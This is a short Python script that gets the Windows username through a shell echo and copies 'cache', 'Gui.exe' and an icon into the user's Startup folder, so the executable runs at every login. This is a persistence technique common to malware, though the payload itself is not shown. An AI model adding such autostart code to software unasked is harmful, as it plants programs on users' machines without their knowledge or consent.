import os
import shutil

req = os.popen("echo %username%").read().rstrip()
mes = f"C:/Users/{req}/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup/"

shutil.copy("cache", f"{mes}")
shutil.copy("Gui.exe", f"{mes}")
shutil.copy("icon.ico", f"{mes}")
